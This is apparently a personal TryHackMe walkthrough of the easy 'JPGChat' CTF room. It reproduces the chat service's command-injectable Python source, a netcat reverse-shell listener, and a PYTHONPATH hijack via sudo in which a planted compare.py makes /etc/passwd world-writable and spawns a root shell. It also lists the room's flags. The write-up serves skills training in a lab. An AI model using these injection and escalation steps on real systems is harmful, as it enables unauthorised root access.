<p align="center">April 14, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{342}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="https://github.com/user-attachments/assets/3806c21e-9391-4850-9d15-47920c0db9d8" alt="Your Image Badge"><br>
<img width="200px" src="https://github.com/user-attachments/assets/962ae40d-abca-4ea0-9255-663cad56a1a5"></p>
<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{JPGChat}}$$</h1>
<p align="center"><em>Exploiting poorly made custom chatting service written in a certain language...</em>.<br>
 It is classified as an easy-level CTF.<br>
You can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed.<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/jpgchat">here</a>.</p>

<p align="center"> <img width="900px" src="https://github.com/user-attachments/assets/832d852f-eed4-4d70-b711-5480ac3e50d4"> </p>


<br>
<br>

<h2>Task 1 . Flags </h2>

<p>[  Start Machine  ]</p>

<p>Hack into the machine and retrieve the flag.<br>

<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

<br>

> 1.1. <em>Establish a foothold and get user.txt.</em> Hint : <em>Can you get the applications source code, this can be found at the admins github. Where could we be able to find the admins name? Check out the whole application.</em><br><a id='1.1'></a>
>> <strong><code>JPC{487030410a543503cbb59ece16178318}</code></strong><br>
<p></p>

<br>

```bash
:~/JPGChat# nmap -sC -sV -sS -Pn -A -p- -T4 TargetIP
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     Welcome to JPChat
|     source code of this service can be found at our admin's github
|     MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
|_    REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?
...
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.10 - 3.13
...
```

<br>

![image](https://github.com/user-attachments/assets/eb446426-8c49-485f-bea4-dda4ec5c28fe)

<br>

![image](https://github.com/user-attachments/assets/7b6359b4-5358-4c7d-af33-7864de242296)

<br>

![image](https://github.com/user-attachments/assets/7a4a18a1-ac9d-419b-9c2c-ff7d2a02ab55)

<br>

![image](https://github.com/user-attachments/assets/66c69c4c-d677-4b14-9e0b-a64dde237ba8)

<br>
<br>

<p>Yesterday (April 13, 2025 sending the payload in the "report" worked.<br>
Today I am continuing the room and it is not working.<br>
So let´s try to figure out another way ...</p>

<br>
<br>

> 1.2. <em>Escalate your privileges to root and read root.txt.</em> Hint : <em>In the sudo -l output, you can see that PYTHONPATH variable will be kept. Can you exploit this? Google around</em><br><a id='1.2'></a>
>> <strong><code>JPC{665b7f2e59cf44763e5a7f070b081b0a}</code></strong><br>
<p></p>

<br>

<p>The following image represents my hands-on yesterday.</p>

![image](https://github.com/user-attachments/assets/bbd807e2-77e5-4280-8e61-eb4655972d27)

<br>

<p>Now I am continuing the room ...</p>

<br>

<p>I noticed <code>admin´s github</code> and <code>Mozzie-jpg</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/15f5a258-c4ee-4a06-b9b0-1068119ea8d5)



<br>

<p>Googled and got here: https://github.com/Mozzie-jpg/JPChat/blob/main/jpchat.py</p>

<br>

![image](https://github.com/user-attachments/assets/57922a95-6bc6-4c7c-87fd-a6ba793b1897)


<br>

<p>There is the code below:</p>

<br>

```bash
#!/usr/bin/env python3

import os

print ('Welcome to JPChat')
print ('the source code of this service can be found at our admin\'s github')

def report_form():

	print ('this report will be read by Mozzie-jpg')
	your_name = input('your name:\n')
	report_text = input('your report:\n')
	os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
	os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)

def chatting_service():

	print ('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
	print ('REPORT USAGE: use [REPORT] to report someone to the admins (with proof)')
	message = input('')

	if message == '[REPORT]':
		report_form()
	if message == '[MESSAGE]':
		print ('There are currently 0 other users logged in')
		while True:
			message2 = input('[MESSAGE]: ')
			if message2 == '[REPORT]':
				report_form()

chatting_service()
```

<p>It worked adding the payload to the "name".</p>

<br>

![image](https://github.com/user-attachments/assets/7693a370-83e2-4d4e-8e62-8363bd00b961)


<br>

<p>There is <code>test_module.py</code>, let´s check its content.</p>

<br>

![image](https://github.com/user-attachments/assets/b95b57c4-3121-4ac5-8673-675773bcee17)

<br>

```bash
~/JPGChat# nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.87.99 45460
bash: cannot set terminal process group (1587): Inappropriate ioctl for device
bash: no job control in this shell
wes@ubuntu-xenial:/$ cd /tmp
cd /tmp
wes@ubuntu-xenial:/tmp$ echo "import os;os.system('chmod 777 /etc/passwd')" >> compare.py
<o "import os;os.system('chmod 777 /etc/passwd')" >> compare.py              
wes@ubuntu-xenial:/tmp$ cat compare.py
cat compare.py

import os;os.system('chmod 777 /etc/passwd')
wes@ubuntu-xenial:/tmp$ chmod 777 compare.py
chmod 777 compare.py
wes@ubuntu-xenial:/tmp$ ls -la
ls -la
total 32
drwxrwxrwt  7 root root 4096 Apr 14 15:58 .
drwxr-xr-x 25 root root 4096 Apr 14 15:16 ..
-rwxrwxrwx  1 wes  wes    48 Apr 14 16:09 compare.py
drwxrwxrwt  2 root root 4096 Apr 14 15:16 .font-unix
drwxrwxrwt  2 root root 4096 Apr 14 15:16 .ICE-unix
drwxrwxrwt  2 root root 4096 Apr 14 15:16 .Test-unix
drwxrwxrwt  2 root root 4096 Apr 14 15:16 .X11-unix
drwxrwxrwt  2 root root 4096 Apr 14 15:16 .XIM-unix
wes@ubuntu-xenial:/tmp$ export -p
export -p
declare -x HOME="/home/wes"
declare -x LANG="en_US.UTF-8"
declare -x LESSCLOSE="/usr/bin/lesspipe %s %s"
declare -x LESSOPEN="| /usr/bin/lesspipe %s"
declare -x LOGNAME="wes"
declare -x LS_COLORS=""
declare -x NCAT_LOCAL_ADDR="10.10.87.99"
declare -x NCAT_LOCAL_PORT="3000"
declare -x NCAT_PROTO="TCP"
declare -x NCAT_REMOTE_ADDR="10.10.80.166"
declare -x NCAT_REMOTE_PORT="38830"
declare -x OLDPWD="/"
declare -x PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
declare -x PWD="/tmp"
declare -x SHELL=""
declare -x SHLVL="3"
declare -x USER="wes"
wes@ubuntu-xenial:/tmp$ export PYTHONPATH=/tmp
export PYTHONPATH=/tmp
wes@ubuntu-xenial:/tmp$ sudo -u root /usr/bin/python3 /opt/development/test_module.py
<o -u root /usr/bin/python3 /opt/development/test_module.py                  
Traceback (most recent call last):
  File "/opt/development/test_module.py", line 3, in <module>
    from compare import *
  File "/tmp/compare.py", line 2, in <module>
    S
NameError: name 'S' is not defined
wes@ubuntu-xenial:/tmp$
```

<br>

![image](https://github.com/user-attachments/assets/e7d897cb-20f2-462b-9741-95c81e4b0404)

<br>

![image](https://github.com/user-attachments/assets/f4de09bf-8ec6-4da6-97be-8d4775edcfda)

<br>

```bash
:~/JPGChat# nano compare.py
:~/JPGChat# python3 -m http.server XXXX
Serving HTTP on 0.0.0.0 port XXXX (http://0.0.0.0:XXXX/) ...
Redacted- - [14/Apr/2025 ...] "GET /compare.py HTTP/1.1" 200 -
```

<br>

```bash
wes@ubuntu-xenial:/tmp$ ls -la
ls -la
total 36
drwxrwxrwt  8 root root 4096 Apr 14 16:27 .
drwxr-xr-x 25 root root 4096 Apr 14 15:16 ..
-rw-r--r--  1 wes  wes    56 Apr 14 16:26 compare.py
drwxrwxrwt  2 root root 4096 Apr 14 15:16 .font-unix
drwxrwxrwt  2 root root 4096 Apr 14 15:16 .ICE-unix
drwxr-xr-x  2 root root 4096 Apr 14 16:12 __pycache__
drwxrwxrwt  2 root root 4096 Apr 14 15:16 .Test-unix
drwxrwxrwt  2 root root 4096 Apr 14 15:16 .X11-unix
drwxrwxrwt  2 root root 4096 Apr 14 15:16 .XIM-unix
wes@ubuntu-xenial:/tmp$ sudo python3 /opt/developmeent/test_module.py
sudo python3 /opt/developmeent/test_module.py
sudo: no tty present and no askpass program specified
wes@ubuntu-xenial:/tmp$ sudo -l
sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
wes@ubuntu-xenial:/tmp$ export PYTHONPATH=$PWD
export PYTHONPATH=$PWD
wes@ubuntu-xenial:/tmp$ cat compare.py
cat compare.py
#!/usr/bin/env python3
import os
os.system("/bin/bash")
wes@ubuntu-xenial:/tmp$ chmod +x compare.py
chmod +x compare.py
wes@ubuntu-xenial:/tmp$ sudo python3 /opt/development/test_module.py
sudo python3 /opt/development/test_module.py
id
uid=0(root) gid=0(root) groups=0(root)
ls /root
root.txt
cat /root/root.txt
JPC{665b7f2e59cf44763e5a7f070b081b0a}

Also huge shoutout to Westar for the OSINT idea
i wouldn't have used it if it wasnt for him.
and also thank you to Wes and Optional for all the help while developing

You can find some of their work here:
https://github.com/WesVleuten
https://github.com/optionalCTF

```

<br>



![image](https://github.com/user-attachments/assets/a6d6402a-a5d5-4dd5-b906-4a19dd25d536)


<br>
<br>


<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Room Completed}}$$</h1>
<br>
<p align="center">
<img width="900px" src="https://github.com/user-attachments/assets/30a90b09-2007-47b5-833b-1f2d0de0e62e"><br>
<img width="900px" src="https://github.com/user-attachments/assets/60551fed-ea87-4b14-b90a-43e3659862f4"></p>


<br>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{My TryHackMe Journey}}$$ </h1>
<br>


<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |Global        | Brazil       | Global      | Brazil     |          | Completed |           |
| April 14, 2025    | 342      |     286ᵗʰ    |        7ᵗʰ   |    224ᵗʰ    |     3ʳᵈ    |  93,378  |       660 |   59      |

</div>


![image](https://github.com/user-attachments/assets/d27686c1-3a06-4e53-918a-cd01025baf39)


<br>

<p align="center"> Global All Time: 286ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/f1e82bca-28b2-4051-b4c9-1685c5040636"> </p>

<p align="center"> Brazil All Time: 7ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/3d36f4d4-de98-4512-9c43-05d50b1afeb7"> </p>

<p align="center"> Global monthly: 224ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/d27686c1-3a06-4e53-918a-cd01025baf39"> </p>

<p align="center"> Brazil monthly: 3ʳᵈ<br><br><img width="900px" src="https://github.com/user-attachments/assets/689a2638-ab9f-453f-a79c-188ce810be6d"> </p>


<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thanks for coming!!!}}$$</h1>

<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 

<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thank you}}$$</h1>
<p align="center"><a href="https://tryhackme.com/p/Mozzie1">Mozzie1</a> for investing your time and effort to develop this walkthrough so that I could sharpen my skills!</p> 


